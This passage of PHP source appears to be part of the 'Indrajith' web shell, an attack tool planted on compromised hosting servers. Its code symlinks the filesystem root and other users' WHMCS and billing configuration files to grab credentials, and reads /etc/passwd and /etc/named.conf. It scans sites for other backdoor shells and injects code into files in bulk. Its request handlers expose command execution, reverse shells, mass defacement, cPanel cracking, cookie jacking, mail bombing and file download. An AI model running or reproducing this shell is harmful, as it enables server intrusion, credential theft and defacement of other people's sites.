    symlink("/home/".$user."/public_html/whmc/WHM/configuration.php", "INDRAJITH/".$user." =>whmc/WHM/configuration.php");
    symlink("/home/".$user."/public_html/whm/WHMCS/configuration.php", "INDRAJITH/".$user." =>whm/WHMCS/configuration.php");
    symlink("/home/".$user."/public_html/whm/whmcs/configuration.php", "INDRAJITH/".$user." =>whm/whmcs/configuration.php");
    symlink("/home/".$user."/public_html/support/configuration.php", "INDRAJITH/".$user." =>support/configuration.php");
    symlink("/home/".$user."/public_html/clients/configuration.php", "INDRAJITH/".$user." =>clients/configuration.php");
    symlink("/home/".$user."/public_html/client/configuration.php", "INDRAJITH/".$user." =>client/configuration.php");
    symlink("/home/".$user."/public_html/clientes/configuration.php", "INDRAJITH/".$user." =>clientes/configuration.php");
    symlink("/home/".$user."/public_html/cliente/configuration.php", "INDRAJITH/".$user." =>cliente/configuration.php");
    symlink("/home/".$user."/public_html/clientsupport/configuration.php", "INDRAJITH/".$user." =>clientsupport/configuration.php");
    symlink("/home/".$user."/public_html/billing/configuration.php", "INDRAJITH/".$user." =>billing/configuration.php");
    symlink("/home/".$user."/public_html/admin/config.php", "INDRAJITH/".$user." =>admin/config.php");
}

function sym_xxx()
{
    global $sym_htaccess,$sym_php_ini;
    mkdir('Indrajith', 0777);
    symlink("/", "Indrajith/root");
    $htaccess=@fopen('Indrajith/.htaccess', 'w');
    fwrite($htaccess,$sym_htaccess);
    $php_ini_x=fopen('Indrajith/php.ini', 'w');
    fwrite($php_ini_x, $sym_php_ini);
    $akps = implode(file("/etc/named.conf"));
    if(!$akps)
    {
        config_grabber_ui();
    }
    else
    {
    $usrd = array();
    foreach($akps as $akp)
    {
        if(eregi("zone", $akp))
        {
            preg_match_all('#zone "(.*)" #', $akp, $akpzz);
            flush();
            if(strlen(trim($akpzz[1][0]))>2)
            {
                $user=posix_getpwuid(@fileowner("/etc/valiases/".$akpzz[1][0]));
                symlinkg($akpzz[1][0],$user['name']);
                flush();
            }
        }
    }
    }
}

function sym_link()
{
    global $sym_htaccess,$sym_php_ini;
    cmd('rm -rf AKP');
    mkdir('AKP', 0755);
    $usrd = array();
    $akps = implode(file("/etc/named.conf"));
    $htaccess=fopen('AKP/.htaccess', 'w');
    fwrite($htaccess,$sym_htaccess);
    $php_ini_x=fopen('AKP/php.ini', 'w');
    fwrite($php_ini_x, $sym_php_ini);
    symlink("/", "AKP/root");
    if(!$file)
    {
        echo "<script>alert('Bind File /etc/passwd Not Found. Its alternative Method')</script>";
        echo "<div id=result><center><h2>SymLink</h2></center><hr /><br /><br /><table class='table'><tr><th>Users</th><th>Exploit</th></tr>";
        $users = file('/etc/passwd');
        foreach($users as $user)
        {
            $user = explode(':', $user);
            echo "<tr><td>".$user[0]."</td><td><a href='AKP/root/home/".$user[0]."/public_html/' target=_blank>SymLink</tr>";
        }
        echo "</table><br /><br /><hr /><br /><br /></div>";
        
    }
    else
    {
        echo "<table class=table><tr><td>Domains</td><td>Users</td><td>Exploit</font></td></tr>";
        foreach($akps as $akp)
        {
            if(eregi("zone", $akp))
            {
                preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                flush();
                if(strlen(trim($akpzz[1][0]))>2)
                {
                    $user=posix_getpwuid(@fileowner("/etc/valiases/".$akpzz[1][0]));
                    echo "<tr><td><a href=http://www.".$akpzz[1][0]." target=_blank>".$akpzz[1][0]."</a><td>".$user['name']."</td><td><a href='AKP/root/home/".$user['name']."/public_html/' target=_blank>SymLink</a></td></tr></table>";
                    flush();
                }
            }
        }
    }
}

function shell_finder_ui()
{
    echo "<div id=result><center><h2>SH3LL SCANNER</h2><hr /><br /><br /><br /><form method='GET'>URL : <input size=50 name='sh311_scanx' value='http://www.ajithkp560.hostei.com/PHP/'><input type='submit' value='   >>  ' /></form><br /><br /><hr /><br /><br />";
}

function shell_finder_bg()
{
    $sh_url=$_GET['sh311_scanx'];
    echo "<div id=result><center><h2>SHELL SCAN</h2><hr /><br /><br /><table class='table'>";
    $ShellZ=array("indrajith.php", "c99.php", "c100.php","r57.php", "b374k.php", "c22.php", "sym.php", "symlink_sa.php", "r00t.php", "webr00t.php", "sql.php","cpanel.php", "wso.php", "404.php", "aarya.php", "greenshell.php", "ddos.php", "madspot.php", "1337.php", "31337.php", "WSO.php", "dz.php", "cpn.php", "sh3ll.php", "mysql.php", "killer.php", "cgishell.pl", "dz0.php", "whcms.php", "vb.php", "gaza.php", "d0mains.php", "changeall.php", "h4x0r.php", "L3b.php", "uploads.php", "shell.asp", "cmd.asp", "sh3ll.asp", "b374k-2.2.php", "m1n1.php", "b374km1n1.php");
    foreach($ShellZ as $shell)
    {
        $urlzzx=$sh_url.$shell;
        if(function_exists('curl_init'))
        {
            echo "<tr><td style='text-align:left'><font color=orange>Checking : </font> <font color=7171C6> $urlzzx </font></td>";
            $ch = curl_init($urlzzx);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_exec($ch);
            $status_code=curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if($status_code==200)
            {
                echo "<td style='text-align:left'><font color=green> Found....</font></td></tr>";
            }
            else
            {
                echo "<td style='text-align:left'><font color=red>Not Found...</font></td></tr>";
            }
        }
        else
        {
            echo "<font color=red>cURL Not Found </font>";
            break;
        }
    }
    echo "</table><br /><br /><hr /><br /><br /></div>";
}

function code_in_ui()
{
    global $sep;
    $mode=$_POST['modexxx'];
    $ftype=$_POST['ffttype'];
    $c_cont=$_POST['code_cont'];
    $ppp=$_POST['path'];
    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode!="" && $ftype!="" && $c_cont!="" && $ppp!="")
    {
        echo "<div id=result><center><h2>Successfully c0d3 inj3cted</h2></center><table class=tbl>";
        switch($mode)
        {
            case "Apender":
                $mmode="a";
                break;
            case "Rewrite":
                $mmode="w";
                break;
        }
        if($handle = opendir($ppp))
        {
            while(($c_file = readdir($handle)) !== False)
            {
                if((preg_match("/$ftype".'$'.'/', $c_file , $matches) != 0) && (preg_match('/'.$c_file.'$/', $self , $matches) != 1))
                {
                    echo "<tr><td><font color=red>$ppp$sep$c_file</font></td></tr>";
                    $fd = fopen($ppp.$sep.$c_file,$mmode);
                    if($fd)
                    {
                        fwrite($fd,$c_cont);
                    }
                    else
                    {
                        alert("Error. Access Denied");
                    }
                }
            }
        }
        echo "</table><br /><br /><hr /><br /><br /></div>";
    }
    else
    {
    ?><?php echo getcwd(); ?><?php
    }
}

if(isset($_GET['down']))
{
    ob_clean();
    $filcont=file_get_contents($_GET['down']);
    header('Content-Description: File Transfer');
    header("Content-type: application/octet-stream");
    header("Content-length: ".strlen($filcont));
    header("Content-disposition: attachment; filename=".basename($_GET['down']).";");
    flush();
    echo $filcont;
    exit;
}

if(isset($_GET['gzip']))
{
    ob_clean();
    $filcont=gzencode(file_get_contents($_GET['down']), 9);
    header('Content-Description: File Transfer');
    header("Content-Type:application/x-gzip;");
    header("Content-length:".strlen($filcont).";");
    header("Content-disposition: attachment; filename=".basename($_GET['gzip']).".gz;");
    flush();
    echo $filcont;
    exit;
}

function ssh_man_ui()
{
    ?><?php
}

function ssh_man_bg()
{
    $ssh_h=$_GET['ssh_host'];
    $ssh_u=$_GET['ssh_user'];
    $ssh_p=$_GET['ssh_pass'];
    if(!function_exists('ssh2_connect'))
    {
        alert("Sorry, Function ssh2_connect is not found");
    }
    $conn=ssh2_connect($ssh_h, 22);
    if(!$conn)
    {
        alert("SSH Host Not Found");
    }
    $log=ssh2_auth_password($conn, $ssh_u, $ssh_p);
    if(!$log)
    {
        alert("SSH Authorication failed");
    }
    $shell=ssh2_shell($conn, "bash");
    if($_GET['ssh_cmd']!="" && $_GET['ssh_cmd'])
    {
        $ssh_cmd=$_GET['ssh_cmd'];
        fwrite($shell, $ssh_cmd);
        sleep(1);
        while($line=fgets($shell))
        {
            flush();
            echo $line."\n";
        }
        ?><?php
    }
    else
    {
    ?><?php
    }
}

function ftp_man_ui()
{
    ?><?php
}

function ftp_man_bg()
{
    echo "<div id=result><center><h2>FTP FILEMANAGER</h2></center><hr />";
    $fhost=$_GET['ftp_host'];
    $fuser=$_GET['ftp_user'];
    $fpass=$_GET['ftp_pass'];
    $fpath=$_GET['fpath'];
    $upl=$_GET['upload_file'];
    $down=$_GET['download_file'];
    if($fpath=="")
    {
        $fpath=ftp_pwd($conn);
    }
    $conn=ftp_connect($fhost);
    if(!$conn)
    {
        alert("FTP Host Not Found!!!");
    }
    if($fuser=="")
    {
        $fuser="anonymous";
    }
    $log=ftp_login($conn, $fuser, $fpass);
    if(!$log)
    {
        alert("FTP Authorication Failed");
    }
    if($upl!="")
    {
        $fp = fopen($upl, 'r');
        if (ftp_fput($conn, $upl, $fp, FTP_ASCII))
        {
            echo "<center><font color=green>Successfully uploaded <font color=red> $upl </font> </font></center>";
        }
        else
        {
            echo "<center><font color=red>There was a problem while uploading <font color=green> $upl </font> </font></center>";
        }
    }
    if($down!="")
    {
        $handle = fopen($down, 'w');
        if (ftp_fget($conn, $handle, $down, FTP_ASCII, 0))
        {
            echo "<center><font color=green>successfully written to <font color=red> $down </font> </font></center>";
        }
        else
        {
            echo "<center><font color=red>There was a problem while downloading <font color=green> $down </font> to <font color=green> $down </font> </font></center>";
        }
    }
    echo "<table class='table'><tr><th>Files</th>";
    ftp_chdir($fpath);
    $list=ftp_rawlist($conn, $fpath);
    foreach($list as $fff)
    {
        echo "<tr><td><pre>$fff</pre></td></tr>";
    }
    echo "</table></div>";
}

//////////////////////////////// Frond End Calls ///////////////////////////////

if(isset($_POST['e_file']) && isset($_POST['e_content_n']))
{
    edit_file_bg();
}

else if(isset($_REQUEST['sh311_scanner']))
{
    shell_finder_ui();
}

else if(isset($_REQUEST['ftp_host']) && isset($_REQUEST['ftp_user']) && isset($_REQUEST['ftp_pass']))
{
    ftp_man_bg();
}

else if(isset($_REQUEST['ftpman']))
{
    ftp_man_ui();
}

else if(isset($_GET['ssh_host']) && isset($_GET['ssh_user']) && isset($_GET['ssh_pass']))
{
    ssh_man_bg();
}

else if(isset($_REQUEST['sshman']))
{
    ssh_man_ui();
}

else if(isset($_REQUEST['c0de_inject']) && isset($_REQUEST['path']))
{
    chdir($_GET['path']);
    code_in_ui();
}

else if(isset($_GET['sh311_scanx']))
{
    shell_finder_bg();
}

else if(isset($_REQUEST['config_grab']))
{
    sym_xxx();
}

else if(isset($_REQUEST['ftp_man']))
{
    ftp_man_ui();
}

else if(isset($_REQUEST['mass_xploit']))
{
    mass_deface_ui();
}

else if(isset($_GET['f_host']) && isset($_GET['f_user']) && isset($_GET['f_pass']))
{
    ftp_man_bg();
}

else if(isset($_GET['mass_name']) && isset($_GET['mass_cont']))
{
    mass_deface_bg();
}

else if(isset($_REQUEST['ftp_anon_scan']))
{
    ftp_anonymous_ui();
}

else if(isset($_GET['ftp_anonz']))
{
    ftp_anonymous_bg();
}

else if(isset($_REQUEST['killme']))
{
    killme();
}

else if(isset($_REQUEST['hexenc']))
{
    hex_encode_ui();
}

else if(isset($_REQUEST['remotefiledown']))
{
    remote_download_ui();
}

else if(isset($_GET['type_r_down']) && isset($_GET['rurlfile']) && isset($_GET['path']))
{
    remote_download_bg();
}

else if(isset($_REQUEST['cpanel_crack']))
{
    cpanel_crack();
}

else if(isset($_REQUEST['rem_web']) && isset($_REQUEST['tryzzz']))
{
    remote_file_check_bg();
}

else if(isset($_REQUEST['typed']) && isset($_REQUEST['typenc']) && isset($_REQUEST['php_content']))
{
    php_ende_bg();
}

else if(isset($_REQUEST['remote_server_scan']))
{
    remote_file_check_ui();
}

else if(isset($_REQUEST['server_exploit_details']))
{
    exploit_details();
}

else if(isset($_REQUEST['from']) && isset($_REQUEST['to_mail']) && isset($_REQUEST['subject_mail']) && isset($_REQUEST['mail_content']))
{
    massmailer_bg();
}

else if(isset($_REQUEST['mysqlman']))
{
    mysqlman();
}

else if(isset($_REQUEST['bomb_to']) && isset($_REQUEST['bomb_subject']) && isset($_REQUEST['bmail_content']))
{
    mailbomb_bg();
}

else if(isset($_REQUEST['cookiejack']))
{
    cookie_jack();
}

else if(isset($_REQUEST['massmailer']))
{
    massmailer_ui();
}

else if(isset($_REQUEST['rename']))
{
    chdir($_GET['path']);
    rename_ui();
}

else if(isset($_GET['old_name']) && isset($_GET['new_name']))
{
    chdir($_GET['path']);
    rename_bg();
}

else if(isset($_REQUEST['encodefile']))
{
    php_ende_ui();
}

else if(isset($_REQUEST['edit']))
{
    edit_file(); 
}

else if(isset($_REQUEST['read']))
{
    chdir($_GET['path']);
    code_viewer();
}

else if(isset($_REQUEST['perm']))
{
    chdir($_GET['path']);
    ch_perm_ui();
}

else if(isset($_GET['path']) && isset($_GET['p_filex']) && isset($_GET['new_perm']))
{
    chdir($_GET['path']);
    ch_perm_bg();
}

else if(isset($_REQUEST['del_fil']))
{
    chdir($_GET['path']);
    delete_file();
    exit;
}
else if(isset($_REQUEST['phpinfo']))
{
    chdir($_GET['path']);
    ob_clean();
    echo phpinfo();
    exit;
}
else if(isset($_REQUEST['del_dir']))
{
    chdir($_GET['path']);
    $d_dir=$_GET['del_dir'];
    deldirs($d_dir);
}
else if(isset($_GET['path']) && isset($_GET['new_file']))
{
    chdir($_GET['path']);
    mk_file_ui();
}
else if(isset($_GET['path']) && isset($_GET['new_f_name']) && isset($_GET['n_file_content']))
{
    mk_file_bg();
}
else if(isset($_GET['path']) && isset($_GET['new_dir']))
{
    chdir($_GET['path']);
    create_dir();
}
else if(isset($_GET['path']) && isset($_GET['cmdexe']))
{
    chdir($_GET['path']);
    cmd();
}
else if(isset($_POST['upload_f']) && isset($_POST['path']))
{
    upload_file();
}
else if(isset($_REQUEST['rs']))
{
    reverse_conn_ui();
}
else if(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port']))
{
    reverse_conn_bg();
}
else if(isset($_REQUEST['safe_mod']) && isset($_REQUEST['path']))
{
    chdir($_GET['path']);
    safe_mode_fuck_ui();
}
else if(isset($_GET['path']) && isset($_GET['safe_mode']))
{
    safe_mode_fuck();
}
else if(isset($_GET['path']) && isset($_REQUEST['forbd_dir']))
{
    AccessDenied();
}

else if(isset($_REQUEST['symlink']))
{
    sym_link();
}

else if(isset($_GET['path']) && isset($_GET['copy']))
{
    copy_file_ui();
}
else if(isset($_GET['c_file']) && isset($_GET['c_target']) &&isset($_GET['cn_name']))
{
    copy_file_bg();
}
else
{
    filemanager_bg();
}

////////////////////////////// End Frond End Calls //////////////////////////////
echo "</div><div id=result><center><p><table class='tbl'>
      <tr><td><form method='GET'>PWD : <input size='50' name='path' value=".getcwd()."><input type='submit' value='   >>   ' /></form></td></tr></table>
      <table class='tbl'><tr>
          <td><form style='float:right;' method='GET'><input name='path' value=".getcwd()." type=hidden><span> New File : </span><input type='submit' value='   >>   ' ><input size='40' name='new_file' /></form>
          </td>
          <td><form  style='float:left;' method='GET'><input name='path' value=".getcwd()." type=hidden><input size='40' name='new_dir'><input type='submit' value='   >>   ' /><span> : New Dir</span></form>
          </td>
      </tr>
      <tr>
          <td><form style='float:right;' method='GET'><input style='float:left;' name='path' value=".getcwd()." type=hidden><span>CMD : </span><input type='submit' value='   >>   ' ><input name='cmdexe' size='40' /></form>
          </td>
          <td><form style='float:left;' method='POST' enctype=\"multipart/form-data\"><input name='path' value=".getcwd()." type=hidden><input size='27' name='upload_f' type='file'><input type='submit' name='upload_f' value='   >>   ' /><span> : Upload File</span></form>
          </td>
        </tr>
      </table></p><p><font size=4 color=green>&copy <a style='color:green; text-decoration:none;' href=http://facebook.com/ajithkp560>AJITH KP</a> & <a style='color:green; text-decoration:none;' href='http://www.facebook.com/vishnunathkp'>VISHNU NATH KP</a> &copy</font><br />&reg TOF [2012] &reg</div>"
?>